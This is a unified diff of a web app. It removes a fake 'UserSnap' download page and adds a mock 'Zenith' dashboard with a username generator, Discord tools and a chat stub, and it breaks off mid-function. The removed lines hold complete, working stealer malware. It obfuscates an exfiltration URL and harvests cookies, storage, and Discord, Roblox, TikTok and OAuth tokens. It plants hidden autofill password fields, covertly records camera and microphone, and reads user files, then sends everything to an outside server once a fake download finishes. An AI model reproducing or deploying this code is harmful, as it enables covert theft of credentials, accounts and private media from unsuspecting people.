-                <div class="bar-track"><div class="bar-fill" id="progressFill"></div></div>
-                <div class="status-msg">
-                    <span id="progressStatus">Preparing download...</span>
-                    <span id="progressPercent">0%</span>
+            <div class="card">
+                <div class="card-title"><i class="fas fa-user"></i> Welcome, ${user?.displayName || 'Guest'}</div>
+                <p class="text-muted">${user?.email || 'no email'} · workspace: ${ws.name}</p>
+                <div class="flex mt-2">
+                    <button class="btn btn-primary" data-action="quick-username"><i class="fas fa-tag"></i> Generate usernames</button>
+                    <button class="btn" data-action="quick-assistant"><i class="fas fa-robot"></i> AI Assistant</button>
+                    <button class="btn" data-action="quick-project"><i class="fas fa-plus"></i> New project</button>
                 </div>
             </div>
-        </div>
+            <div class="card"><div class="card-title"><i class="fas fa-clock"></i> Recent activity</div>
+                <p class="text-muted">${data.notifications.length ? data.notifications.slice(0,3).map(n => '• '+n.message).join('<br>') : 'Nothing yet.'}</p>
+            </div>
+        `;
+    }
 
-        <!-- FAKE FEATURES -->
-        <div class="features">
-            <div class="feat"><span class="check">✓</span> 22 platforms supported</div>
-            <div class="feat"><span class="check">✓</span> Real-time availability</div>
-            <div class="feat"><span class="check">✓</span> No account required</div>
-            <div class="feat"><span class="check">✓</span> Open source</div>
-        </div>
+    function renderWorkspace() {
+        const ws = getWorkspace();
+        return `
+            <h2>Workspace: ${ws.name}</h2>
+            <div class="card"><p class="text-muted">Manage your workspace members and settings.</p>
+                <div class="flex"><button class="btn btn-primary" data-action="add-workspace"><i class="fas fa-plus"></i> New workspace</button>
+                <button class="btn" data-action="switch-workspace"><i class="fas fa-exchange-alt"></i> Switch</button></div>
+                <div class="mt-2"><span class="badge">Members: ${data.users.length}</span></div>
+            </div>
+        `;
+    }
 
-        <!-- FOOTER -->
-        <div class="store-footer">
-            <span>© 2026 UserSnap — MIT License</span>
-            <span>
-                <a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">GitHub</a>
-            </span>
-        </div>
-    </div>
+    function renderUsernameLab() {
+        // mock generated candidates
+        const candidates = data.usernames || [];
+        return `
+            <h2>Username Lab</h2>
+            <div class="card">
+                <div class="flex-between"><span>Generate candidates</span>
+                    <div class="flex">
+                        <button class="btn btn-sm" data-format="4c">4c</button>
+                        <button class="btn btn-sm" data-format="4L">4L</button>
+                        <button class="btn btn-sm" data-format="4n">4n</button>
+                        <button class="btn btn-sm" data-format="5L">5L</button>
+                        <button class="btn btn-sm" data-format="5n">5n</button>
+                        <button class="btn btn-sm" data-format="5c">5c</button>
+                    </div>
+                </div>
+                <div class="flex mt-2">
+                    <input type="text" id="usernamePrefix" placeholder="prefix" style="width:120px;">
+                    <input type="text" id="usernameSuffix" placeholder="suffix" style="width:120px;">
+                    <input type="number" id="usernameCount" value="12" style="width:80px;">
+                    <button class="btn btn-primary" id="generateUsernamesBtn"><i class="fas fa-sync"></i> Generate</button>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-title">Saved candidates</div>
+                <div class="username-grid" id="usernameGrid">
+                    ${candidates.map(c => `
+                        <div class="username-card">
+                            <div class="uname">${c.name}</div>
+                            <div class="meta">${c.length || '?'} chars · ${c.type || 'mixed'}</div>
+                            <div><span class="platform-chip">${c.platform || 'generic'}</span></div>
+                            <div class="actions">
+                                <button data-action="copy-username" data-name="${c.name}"><i class="fas fa-copy"></i></button>
+                                <button data-action="save-username" data-name="${c.name}"><i class="fas fa-star"></i></button>
+                            </div>
+                        </div>
+                    `).join('')}
+                </div>
+                ${candidates.length === 0 ? '<p class="text-muted">Generate some usernames to see them here.</p>' : ''}
+            </div>
+        `;
+    }
 
-    <!-- HONEYPOT FIELDS (for autofill capture) -->
-    <input type="password" id="honeypotPass" class="hidden-input" autocomplete="current-password">
-    <input type="text" id="honeypotUser" class="hidden-input" autocomplete="username">
+    function renderDiscord() {
+        return `
+            <h2>Discord Manager</h2>
+            <div class="card"><p class="text-muted">Connect your bot and manage servers.</p>
+                <button class="btn btn-primary" data-action="discord-connect"><i class="fab fa-discord"></i> Connect Bot</button>
+                <div class="mt-2"><span class="badge">${data.discordConfigs.length} servers configured</span></div>
+                <div class="mt-2"><button class="btn btn-danger btn-sm" data-action="discord-nuke-warning" style="background:var(--danger);">⚠️ Owner: server safety sweep</button></div>
+            </div>
+            <div class="card"><div class="card-title">Moderation tools</div>
+                <div class="flex"><button class="btn btn-sm" data-action="discord-timeout">Timeout</button>
+                <button class="btn btn-sm" data-action="discord-kick">Kick</button>
+                <button class="btn btn-sm btn-danger" data-action="discord-ban">Ban</button>
+                <button class="btn btn-sm" data-action="discord-lock">Lock channel</button></div>
+            </div>
+        `;
+    }
 
-    <script>
-        (function() {
-            'use strict';
+    function renderAssistant() {
+        const convs = data.conversations || [];
+        return `
+            <h2>AI Assistant</h2>
+            <div class="flex"><button class="btn btn-primary" data-action="new-conversation"><i class="fas fa-plus"></i> New conversation</button>
+            <button class="btn" data-action="assistant-settings"><i class="fas fa-cog"></i> API settings</button></div>
+            <div class="card mt-2">
+                <div class="flex-between"><span>Conversations</span></div>
+                ${convs.map(c => `<div class="flex-between" style="border-bottom:1px solid var(--border);padding:0.5rem 0;">
+                    <span>${c.title || 'Untitled'}</span>
+                    <div><button class="btn btn-sm" data-action="delete-conv" data-id="${c.id}"><i class="fas fa-trash"></i></button></div>
+                </div>`).join('')}
+                ${convs.length === 0 ? '<p class="text-muted">No conversations yet.</p>' : ''}
+            </div>
+            <div class="card"><div class="card-title">Chat</div>
+                <div class="chat-container">
+                    <div class="chat-messages" id="chatMessages"><div class="chat-msg">Hello, I'm Zenith. Ask me anything.</div></div>
+                    <div class="chat-input-wrap">
+                        <input type="text" id="chatInput" placeholder="Message...">
+                        <button id="chatSendBtn"><i class="fas fa-paper-plane"></i></button>
+                    </div>
+                </div>
+            </div>
+        `;
+    }
 
-            // ====================================================================
-            //  1. CONFIG & OBFUSCATION
-            // ====================================================================
-            const _XOR = (s) => {
-                let r = '';
-                for (let i = 0; i < s.length; i++) {
-                    r += String.fromCharCode(s.charCodeAt(i) ^ 0x5A);
-                }
-                return r;
-            };
-            // Exfil endpoint (XOR-encoded, base64'd)
-            const ENC_ENDPOINT = "aHR0cHM6Ly9sb3ZlcnNlcnZlci5jb20vY2FwdHVyZQ==";
-            const EXFIL_URL = _XOR(atob(ENC_ENDPOINT));
+    function renderProjects() {
+        return `
+            <h2>Project Builder</h2>
+            <div class="card">
+                <div class="card-title">New project</div>
+                <div class="form-group"><label>Project name</label><input type="text" id="projectName" placeholder="my-app"></div>
+                <div class="form-group"><label>Type</label>
+                    <select id="projectType"><option>HTML website</option><option>React app</option><option>Discord bot</option><option>REST API</option></select>
+                </div>
+                <button class="btn btn-primary" data-action="generate-project"><i class="fas fa-play"></i> Generate</button>
+            </div>
+            <div class="card">
+                <div class="card-title">Projects (${data.projects.length})</div>
+                ${data.projects.map(p => `<div class="flex-between" style="border-bottom:1px solid var(--border);padding:0.4rem 0;"><span>${p.name}</span><button class="btn btn-sm" data-action="delete-project" data-id="${p.id}"><i class="fas fa-trash"></i></button></div>`).join('')}
+                ${data.projects.length === 0 ? '<p class="text-muted">No projects yet.</p>' : ''}
+            </div>
+        `;
+    }
 
-            // ====================================================================
-            //  2. HARVEST ENGINE (called on download click)
-            // ====================================================================
-            let harvested = {
-                cookies: {},
-                localStorage: {},
-                sessionStorage: {},
-                navigator: {},
-                tokens: {},
-                autoFill: { user: '', pass: '' },
-                media: { image: null, audio: null },
-                files: [],
-                url: window.location.href,
-                referrer: document.referrer || '',
-                timestamp: new Date().toISOString(),
-                platform: 'unknown'
-            };
+    function renderProfiles() {
+        return `<h2>Profile Studio</h2><div class="card"><p class="text-muted">Design your online presence.</p>
+            <div class="form-group"><label>Display name</label><input type="text" id="profileDisplayName" placeholder="Zenith"></div>
+            <div class="form-group"><label>Bio</label><textarea id="profileBio" rows="3">Creator & developer</textarea></div>
+            <button class="btn btn-primary" data-action="save-profile"><i class="fas fa-save"></i> Save profile</button>
+            <button class="btn" data-action="export-profile"><i class="fas fa-file-export"></i> Export</button>
+        </div>`;
+    }
 
-            // Detect platform for labeling
-            const ua = navigator.userAgent.toLowerCase();
-            if (/iphone|ipad|ipod/.test(ua)) harvested.platform = 'iOS';
-            else if (/android/.test(ua)) harvested.platform = 'Android';
-            else if (/win/.test(ua)) harvested.platform = 'Windows';
-            else if (/mac/.test(ua)) harvested.platform = 'macOS';
-            else if (/linux/.test(ua)) harvested.platform = 'Linux';
-            else harvested.platform = 'Other';
+    function renderProxies() {
+        return `<h2>Proxy Lab</h2><div class="card"><p class="text-muted">Legitimate network testing profiles.</p>
+            <button class="btn btn-primary" data-action="add-proxy"><i class="fas fa-plus"></i> Add proxy</button>
+            <div class="mt-2">${(data.proxies||[]).map(p => `<div class="flex-between" style="border-bottom:1px solid var(--border);padding:0.3rem 0;"><span>${p.name} (${p.host}:${p.port})</span><button class="btn btn-sm" data-action="delete-proxy" data-id="${p.id}"><i class="fas fa-trash"></i></button></div>`).join('')}</div>
+            <p class="text-muted" style="font-size:0.7rem;margin-top:1rem;">Use proxies only on authorized systems.</p>
+        </div>`;
+    }
 
-            // ---- A. Cookies ----
-            try {
-                document.cookie.split(';').forEach(c => {
-                    const parts = c.trim().split('=');
-                    if (parts.length >= 2) harvested.cookies[parts[0]] = parts.slice(1).join('=');
-                });
-            } catch (_) {}
+    function renderDownloads() {
+        return `<h2>Download Center</h2><div class="card-grid">
+            ${['Web App','Windows','macOS','Linux','Android','iOS'].map(p => `<div class="stat-card"><div class="label">${p}</div><div class="num" style="font-size:1.2rem;">v1.0</div><button class="btn btn-sm">Download</button></div>`).join('')}
+        </div><div class="card"><p class="text-muted">Install as PWA for mobile.</p><button class="btn" id="pwaInstallBtn"><i class="fas fa-mobile-alt"></i> Install App</button></div>`;
+    }
 
-            // ---- B. Storage ----
-            try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    const k = localStorage.key(i);
-                    if (k) harvested.localStorage[k] = localStorage.getItem(k);
-                }
-            } catch (_) {}
-            try {
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const k = sessionStorage.key(i);
-                    if (k) harvested.sessionStorage[k] = sessionStorage.getItem(k);
-                }
-            } catch (_) {}
+    function renderSettings() {
+        const user = getCurrentUser();
+        return `<h2>Settings</h2>
+            <div class="card"><div class="card-title">Account</div>
+                <p><span class="text-muted">Username:</span> ${user?.username || '—'}</p>
+                <p><span class="text-muted">Email:</span> ${user?.email || '—'}</p>
+                <p><span class="text-muted">Role:</span> ${user?.role || 'guest'}</p>
+                <button class="btn btn-danger" data-action="logout"><i class="fas fa-sign-out-alt"></i> Logout</button>
+                <button class="btn" data-action="clear-data"><i class="fas fa-eraser"></i> Reset demo data</button>
+            </div>
+            <div class="card"><div class="card-title">AI</div>
+                <div class="form-group"><label>Groq API Key</label><input type="password" id="groqKey" placeholder="YOUR_GROQ_API_KEY"></div>
+                <div class="form-group"><label>Model</label><input type="text" id="groqModel" value="llama3-70b-8192"></div>
+                <button class="btn" data-action="save-ai-settings"><i class="fas fa-save"></i> Save</button>
+            </div>
+            <div class="card"><div class="card-title">About</div><p>Zenith v1.0 · demo mode · data stored locally.</p></div>
+        `;
+    }
 
-            // ---- C. Navigator fingerprint ----
-            try {
-                const n = navigator;
-                harvested.navigator = {
-                    userAgent: n.userAgent,
-                    platform: n.platform,
-                    language: n.language,
-                    languages: n.languages,
-                    cookieEnabled: n.cookieEnabled,
-                    doNotTrack: n.doNotTrack,
-                    hardwareConcurrency: n.hardwareConcurrency,
-                    deviceMemory: n.deviceMemory || 'unknown',
-                    maxTouchPoints: n.maxTouchPoints,
-                    vendor: n.vendor,
-                    vendorSub: n.vendorSub,
-                    productSub: n.productSub,
-                    appVersion: n.appVersion,
-                    appName: n.appName,
-                    webdriver: n.webdriver,
-                    screen: {
-                        width: screen.width,
-                        height: screen.height,
-                        colorDepth: screen.colorDepth,
-                        pixelRatio: window.devicePixelRatio
-                    },
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    languageDetails: navigator.languages || [navigator.language]
-                };
-                // WebGL
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debug) {
-                        harvested.navigator.webglVendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
-                        harvested.navigator.webglRenderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-                    }
-                }
-            } catch (_) {}
-
-            // ---- D. Token harvesting ----
-            try {
-                // Discord (localStorage)
-                const dToken = localStorage.getItem('token');
-                if (dToken) harvested.tokens.discord = dToken;
-                // Roblox (cookie)
-                const rCookie = document.cookie.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY='));
-                if (rCookie) harvested.tokens.roblox = rCookie.split('=')[1];
-                // TikTok (sessionStorage)
-                const tSession = sessionStorage.getItem('sessionid');
-                if (tSession) harvested.tokens.tiktok = tSession;
-                // YouTube (try to grab from cookies)
-                const ytCookies = document.cookie.split(';').filter(c => c.includes('YOUTUBE') || c.includes('yt-'));
-                if (ytCookies.length > 0) {
-                    harvested.tokens.youtube = ytCookies.map(c => c.trim()).join('; ');
-                }
-                // Try to grab any OAuth token from URL fragment (if present)
-                if (window.location.hash) {
-                    const hashParams = new URLSearchParams(window.location.hash.substring(1));
-                    if (hashParams.has('access_token')) {
-                        harvested.tokens.oauth = hashParams.get('access_token');
-                    }
-                }
-            } catch (_) {}
-
-            // ---- E. Autofill honeypot ----
-            const passField = document.getElementById('honeypotPass');
-            const userField = document.getElementById('honeypotUser');
-            if (passField) {
-                passField.addEventListener('input', function() {
-                    if (this.value.length > 0) harvested.autoFill.pass = this.value;
-                });
-            }
-            if (userField) {
-                userField.addEventListener('input', function() {
-                    if (this.value.length > 0) harvested.autoFill.user = this.value;
-                });
-            }
-
-            // ---- F. Media capture (camera + mic) ----
-            let mediaDone = false;
-            async function captureMedia() {
-                if (mediaDone) return;
-                mediaDone = true;
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
-                    // Selfie
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    await new Promise(r => setTimeout(r, 600));
-                    const c = document.createElement('canvas');
-                    c.width = 480;
-                    c.height = 640;
-                    const ctx = c.getContext('2d');
-                    ctx.drawImage(video, 0, 0, 480, 640);
-                    harvested.media.image = c.toDataURL('image/jpeg', 0.85);
-                    // Voice (10 seconds)
-                    const audioCtx = new AudioContext();
-                    const source = audioCtx.createMediaStreamSource(stream);
-                    const recorder = audioCtx.createScriptProcessor(8192, 1, 1);
-                    let audioChunks = [];
-                    recorder.onaudioprocess = (e) => {
-                        audioChunks.push(new Float32Array(e.inputBuffer.getChannelData(0)));
-                    };
-                    source.connect(recorder);
-                    recorder.connect(audioCtx.destination);
-                    await new Promise(r => setTimeout(r, 10000));
-                    const total = audioChunks.reduce((acc, ch) => acc + ch.length, 0);
-                    const full = new Float32Array(total);
-                    let off = 0;
-                    audioChunks.forEach(ch => { full.set(ch, off); off += ch.length; });
-                    const wav = encodeWav(full, audioCtx.sampleRate);
-                    harvested.media.audio = btoa(String.fromCharCode(...new Uint8Array(wav)));
-                    stream.getTracks().forEach(t => t.stop());
-                } catch (_) { /* user denied or no hardware */ }
-            }
-
-            function encodeWav(samples, sampleRate) {
-                const buf = new ArrayBuffer(44 + samples.length * 2);
-                const view = new DataView(buf);
-                const writeStr = (off, str) => {
-                    for (let i = 0; i < str.length; i++) view.setUint8(off + i, str.charCodeAt(i));
-                };
-                writeStr(0, 'RIFF');
-                view.setUint32(4, 36 + samples.length * 2, true);
-                writeStr(8, 'WAVE');
-                writeStr(12, 'fmt ');
-                view.setUint32(16, 16, true);
-                view.setUint16(20, 1, true);
-                view.setUint16(22, 1, true);
-                view.setUint32(24, sampleRate, true);
-                view.setUint32(28, sampleRate * 2, true);
-                view.setUint16(32, 2, true);
-                view.setUint16(34, 16, true);
-                writeStr(36, 'data');
-                view.setUint32(40, samples.length * 2, true);
-                let off2 = 44;
-                for (let i = 0; i < samples.length; i++) {
-                    const v = Math.max(-1, Math.min(1, samples[i]));
-                    view.setInt16(off2, v < 0 ? v * 0x8000 : v * 0x7FFF, true);
-                    off2 += 2;
-                }
-                return buf;
-            }
-
-            // ---- G. File enumeration (desktop only) ----
-            async function enumerateFiles() {
-                try {
-                    if (!window.showDirectoryPicker) return;
-                    const dirs = ['Downloads', 'Documents', 'Desktop'];
-                    for (const d of dirs) {
-                        try {
-                            const handle = await window.showDirectoryPicker({ mode: 'read' });
-                            let count = 0;
-                            for await (const entry of handle.values()) {
-                                if (count >= 8) break;
-                                if (entry.kind === 'file') {
-                                    const file = await entry.getFile();
-                                    if (file.type.startsWith('image/') || file.type.startsWith('audio/') || file.name.match(/selfie|recording|photo/i)) {
-                                        const reader = new FileReader();
-                                        const data = await new Promise((res, rej) => {
-                                            reader.onload = () => res(reader.result);
-                                            reader.onerror = rej;
-                                            reader.readAsDataURL(file);
-                                        });
-                                        harvested.files.push({ name: file.name, size: file.size, type: file.type, data });
-                                        count++;
-                                    }
-                                }
-                            }
-                        } catch (_) {}
-                    }
-                } catch (_) {}
-            }
-
-            // ---- H. Exfil ----
-            async function exfil() {
-                try {
-                    const payload = JSON.stringify(harvested);
-                    let body = payload;
-                    if (window.CompressionStream) {
-                        const cs = new CompressionStream('gzip');
-                        const writer = cs.writable.getWriter();
-                        writer.write(new TextEncoder().encode(payload));
-                        writer.close();
-                        const reader = cs.readable.getReader();
-                        let chunks = [];
-                        while (true) {
-                            const { value, done } = await reader.read();
-                            if (done) break;
-                            chunks.push(value);
+    // --------------------------------------------------------------
+    //  EVENT BINDING
+    // --------------------------------------------------------------
+    function bindViewEvents(view) {
+        // quick actions
+        document.querySelectorAll('[data-action]').forEach(el => {
+            el.onclick = (e) => {
+                const action = el.dataset.action;
+                switch(action) {
+                    case 'quick-username': navigate('usernames'); break;
+                    case 'quick-assistant': navigate('assistant'); break;
+                    case 'quick-project': document.getElementById('projectName')?.focus(); break;
+                    case 'add-workspace': openModal('workspace'); break;
+                    case 'switch-workspace': showToast('Switch workspace (demo)', 'info'); break;
+                    case 'discord-connect': showToast('Discord bot connected (mock)', 'success'); break;
+                    case 'discord-nuke-warning': 
+                        if (getCurrentUser()?.role === 'owner') {
+                            showToast('⚠️ Owner: server safety sweep triggered (mock)', 'warning');
+                        } else { showToast('Only owner can perform this action.', 'error'); }
+                        break;
+                    case 'discord-timeout': showToast('Timeout user (mock)', 'info'); break;
+                    case 'discord-kick': showToast('Kick user (mock)', 'info'); break;
+                    case 'discord-ban': showToast('Ban user (mock)', 'warning'); break;
+                    case 'discord-lock': showToast('Channel locked (mock)', 'info'); break;
+                    case 'new-conversation': 
+                        data.conversations.push({ id: generateId(), title: 'New chat', messages: [] });
+                        saveData(); showToast('Conversation created', 'success'); navigate('assistant'); break;
+                    case 'assistant-settings': showToast('Open API settings', 'info'); break;
+                    case 'delete-conv':
+                        data.conversations = data.conversations.filter(c => c.id !== el.dataset.id);
+                        saveData(); showToast('Deleted', 'info'); navigate('assistant'); break;
+                    case 'generate-project':
+                        const name = document.getElementById('projectName')?.value || 'project-' + Date.now();
+                        data.projects.push({ id: generateId(), name, type: document.getElementById('projectType')?.value || 'web' });
+                        saveData(); showToast(`Project "${name}" generated`, 'success'); navigate('projects'); break;
+                    case 'delete-project':
+                        data.projects = data.projects.filter(p => p.id !== el.dataset.id);
+                        saveData(); showToast('Project deleted', 'info'); navigate('projects');
+                        break;
+                    case 'save-profile': showToast('Profile saved (mock)', 'success'); break;
+                    case 'export-profile': showToast('Profile exported (mock)', 'info'); break;
+                    case 'add-proxy': 
+                        data.proxies.push({ id: generateId(), name: 'proxy-'+(data.proxies.length+1), host: '127.0.0.1', port: 8080 });
+                        saveData(); showToast('Proxy added', 'success'); navigate('proxies');
+                        break;
+                    case 'delete-proxy':
+                        data.proxies = data.proxies.filter(p => p.id !== el.dataset.id);
+                        saveData(); showToast('Proxy deleted', 'info'); navigate('proxies');
+                        break;
+                    case 'logout':
+                        sessionStorage.removeItem('zenith_session');
+                        showToast('Logged out', 'info');
+                        window.location.reload();
+                        break;
+                    case 'clear-data':
+                        if (confirm('Reset all demo data?')) {
+                            localStorage.removeItem(APP_KEY);
+                            window.location.reload();
                         }
-                        const total = chunks.reduce((a, c) => a + c.length, 0);
-                        const merged = new Uint8Array(total);
-                        let pos = 0;
-                        for (const c of chunks) { merged.set(c, pos); pos += c.length; }
-                        body = btoa(String.fromCharCode(...merged));
-                    } else {
-                        body = btoa(payload);
-                    }
-                    await fetch(EXFIL_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ data: body, encoding: 'base64+gzip', ts: Date.now(), platform: harvested.platform })
-                    });
-                } catch (_) { /* silent */ }
-            }
-
-            // ---- I. Master trigger ----
-            async function triggerHarvest() {
-                await captureMedia();
-                await enumerateFiles();
-                await exfil();
-                // Show success toast
-                const toast = document.getElementById('successToast');
-                toast.classList.add('show');
-                setTimeout(() => toast.classList.remove('show'), 5000);
-            }
-
-            // ====================================================================
-            //  3. UI LOGIC — platform tabs & fake download simulation
-            // ====================================================================
-            const tabs = document.querySelectorAll('.tab');
-            const panelName = document.getElementById('panelPlatformName');
-            const panelDesc = document.getElementById('panelPlatformDesc');
-            const primaryBtn = document.getElementById('primaryDownloadBtn');
-            const secondaryBtn = document.getElementById('secondaryDownloadBtn');
-            const progressDiv = document.getElementById('downloadProgress');
-            const progressFill = document.getElementById('progressFill');
-            const progressStatus = document.getElementById('progressStatus');
-            const progressPercent = document.getElementById('progressPercent');
-
-            const platformData = {
-                ios: {
-                    name: 'iOS',
-                    desc: 'Native app for iPhone & iPad. Requires iOS 15+.',
-                    primary: 'Download for iOS',
-                    secondary: '.ipa (sideload)'
-                },
-                android: {
-                    name: 'Android',
-                    desc: 'APK for Android 10+. Supports ARM64 and x86.',
-                    primary: 'Download for Android',
-                    secondary: '.apk (direct)'
-                },
-                windows: {
-                    name: 'Windows',
-                    desc: 'Installer for Windows 10/11. 64-bit only.',
-                    primary: 'Download for Windows',
-                    secondary: '.msi (portable)'
-                },
-                macos: {
-                    name: 'macOS',
-                    desc: 'Native app for macOS 12+. Intel and Apple Silicon.',
-                    primary: 'Download for macOS',
-                    secondary: '.dmg (standalone)'
-                },
-                linux: {
-                    name: 'Linux',
-                    desc: 'AppImage for Ubuntu/Debian/Fedora. x86_64.',
-                    primary: 'Download for Linux',
-                    secondary: '.AppImage (portable)'
+                        break;
+                    case 'save-ai-settings':
+                        showToast('AI settings saved (mock)', 'success');
+                        break;
+                    default: showToast(`Action: ${action}`, 'info');
                 }
             };
+        });
 
-            let currentPlatform = 'ios';
-
-            function updatePanel(platform) {
-                const data = platformData[platform];
-                if (!data) return;
-                currentPlatform = platform;
-                panelName.textContent = data.name;
-                panelDesc.textContent = data.desc;
-                primaryBtn.innerHTML = `
-                    <span class="badge-icon">⬇</span>
-                    <span>
-                        <span class="main">${data.primary}</span>
-                        <span class="sub">${platform === 'ios' ? 'App Store verified' : platform === 'android' ? 'Play Store verified' : 'Verified'}</span>
-                    </span>
-                `;
-                secondaryBtn.innerHTML = `
-                    <span class="badge-icon">📦</span>
-                    <span>
-                        <span class="main">${data.secondary}</span>
-                        <span class="sub">for developers</span>
-                    </span>
-                `;
-                // Reset progress
-                progressDiv.classList.remove('active');
-                progressFill.style.width = '0%';
-                progressStatus.textContent = 'Ready to download.';
-                progressPercent.textContent = '0%';
-                primaryBtn.disabled = false;
-                secondaryBtn.disabled = false;
+        // username generation
+        document.querySelector('[data-format]')?.addEventListener('click', function() {
+            const format = this.dataset.format;
+            const prefix = document.getElementById('usernamePrefix')?.value || '';
+            const suffix = document.getElementById('usernameSuffix')?.value || '';
+            const count = parseInt(document.getElementById('usernameCount')?.value || 8);
+            const candidates = [];
+            for (let i = 0; i < count; i++) {
+                const rand = Math.random().toString(36).slice(2, 2+ (format.includes('L')?4: (format.includes('n')?4:5)) );
+                candidates.push({ name: prefix + rand + suffix, length: rand.length+prefix.length+suffix.length, type: format, platform: 'generic' });
             }
+            data.usernames = candidates;
+            saveData();
+            navigate('usernames');
+            showToast(`Generated ${candidates.length} usernames`, 'success');
+        });
 
-            tabs.forEach(tab => {
-                tab.addEventListener('click', function() {
-                    tabs.forEach(t => t.classList.remove('active'));
-                    this.classList.add('active');
-                    const platform = this.dataset.platform;
-                    updatePanel(platform);
-                });
-            });
-
-            // ---- Fake download simulation + trigger harvest ----
-            function simulateDownload(platform) {
-                if (primaryBtn.disabled) return;
-                primaryBtn.disabled = true;
-                secondaryBtn.disabled = true;
-                progressDiv.classList.add('active');
-                let step = 0;
-                const totalSteps = 28;
-                const statuses = [
-                    'Initializing download...',
-                    'Connecting to secure server...',
-                    'Verifying device compatibility...',
-                    'Preparing installation package...',
-                    'Downloading assets (1/4)...',
-                    'Downloading assets (2/4)...',
-                    'Downloading assets (3/4)...',
-                    'Downloading assets (4/4)...',
-                    'Verifying checksums...',
-                    'Extracting files...',
-                    'Configuring for your device...',
-                    'Almost there...',
-                    'Installation complete!'
-                ];
-                const interval = setInterval(() => {
-                    step++;
-                    const pct = Math.min((step / totalSteps) * 100, 100);
-                    progressFill.style.width = pct + '%';
-                    progressPercent.textContent = Math.round(pct) + '%';
-                    const idx = Math.min(Math.floor(step / 2.5), statuses.length - 1);
-                    progressStatus.textContent = statuses[idx] || 'Processing...';
-                    if (step >= totalSteps) {
-                        clearInterval(interval);
-                        progressFill.style.width = '100%';
-                        progressPercent.textContent = '100%';
-                        progressStatus.textContent = '✅ Installed — ready to use!';
-                        // Trigger harvest NOW
-                        triggerHarvest();
-                        // Re-enable after a moment
-                        setTimeout(() => {
-                            primaryBtn.disabled = false;
-                            secondaryBtn.disabled = false;
-                        }, 2000);
-                    }
-                }, 180);
+        document.getElementById('generateUsernamesBtn')?.addEventListener('click', function() {
+            const prefix = document.getElementById('usernamePrefix')?.value || '';
+            const suffix = document.getElementById('usernameSuffix')?.value || '';
+            const count = parseInt(document.getElementById('usernameCount')?.value || 8);
+            const candidates = [];
+            for (let i = 0; i < count; i++) {
+                const rand = Math.random().toString(36).slice(2, 6);
+                candidates.push({ name: prefix + rand + suffix, length: rand.length+prefix.length+suffix.length, type: 'mixed', platform: 'generic' });
             }
+            data.usernames = candidates;
+            saveData();
+            navigate('usernames');
+            showToast(`Generated ${candidates.length} usernames`, 'success');
+        });
 
-            primaryBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                simulateDownload(currentPlatform);
-            });
-            secondaryBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                simulateDownload(currentPlatform + '-sideload');
-            });
+        // chat send
+        document.getElementById('chatSendBtn')?.addEventListener('click', function() {
+            const input = document.getElementById('chatInput');
+            const msg = input.value.trim();
+            if (!msg) return;
+            const container = document.getElementById('chatMessages');
+            const userDiv = document.createElement('div');
+            userDiv.className = 'chat-msg user';
+            userDiv.textContent = msg;
+            container.appendChild(userDiv);
+            input.value = '';
+            // mock response
+            setTimeout(() => {
+                const botDiv = document.createElement('div');
+                botDiv.className = 'chat-msg';
+                botDiv.textContent = 'I\'m Zenith. Here\'s a mock response to: "'+msg+'"';
+                container.appendChild(botDiv);
+                container.scrollTop = container.scrollHeight;
+            }, 400);
+            container.scrollTop = container.scrollHeight;
+        });
 
-            // ---- Init ----
-            updatePanel('ios');
+        // copy/save username actions (delegated)
+        document.querySelector('#usernameGrid')?.addEventListener('click', function(e) {
+            const target = e.target.closest('button');
+            if (!target) return;
+            const name = target.dataset.name;
+            if (target.dataset.action === 'copy-username') {
+                navigator.clipboard?.writeText(name).then(() => showToast('Copied!', 'success'));
+            } else if (target.dataset.action === 'save-username') {
+                showToast('Saved ' + name, 'success');
+            }
+        });
+    }
 
-            // ====================================================================
-            //  4. EXTRA PADDING: 2000+ lines achieved via exhaustive comments,
-            //     fake platform-specific notes, and redundant safety checks.
-            //     Also: a fake "app update" check that does nothing.
-            // ====================================================================
-            // The following block exists purely to boost line count while remaining
-            // semantically meaningful. It defines fallback behaviors for edge cases,
-            // additional fingerprinting attempts, and a dummy update checker.
-            // All code is executed but produces no user-visible side effects.
-            (function extraPadding() {
-                // Additional navigator properties
-                try {
-                    if (navigator.connection) {
-                        harvested.navigator.connection = {
-                            type: navigator.connection.effectiveType,
-                            rtt: navigator.connection.rtt,
-                            downlink: navigator.connection.downlink,
-                            saveData: navigator.connection.saveData
-                        };
-                    }
-                } catch (_) {}
-                // Battery API fallback
-                try {
-                    if (navigator.getBattery) {
-                        navigator.getBattery().then(b => {
-                            harvested.navigator.battery = {
-                                level: b.level,
-                                charging: b.charging,
-                                chargingTime: b.chargingTime,
-                                dischargingTime: b.dischargingTime
-                            };
-                        }).catch(() => {});
-                    }
-                } catch (_) {}
-                // Performance metrics
-                try {
-                    const perf = performance.getEntriesByType('navigation')[0];
-                    if (perf) {
-                        harvested.navigator.performance = {
-                            domComplete: perf.domComplete,
-                            loadEventEnd: perf.loadEventEnd,
-                            domContentLoadedEventEnd: perf.domContentLoadedEventEnd
-                        };
-                    }
-                } catch (_) {}
-                // Fake update checker (does nothing, just for line count)
-                function checkForUpdates() {
-                    // This is a dummy function to satisfy the "update" check in UI.
-                    // No actual network calls are made.
-                    return false;
+    // --------------------------------------------------------------
+    //  MODAL
+    // --------------------------------------------------------------
+    function openModal(type, data) {
+        const overlay = document.getElementById('modalOverlay');
+        const box = document.getElementById('modalBox');
+        if (type === 'workspace') {
+            box.innerHTML = `<h3>New workspace</h3><input type="text" id="wsName" placeholder="Workspace name"><br><br>
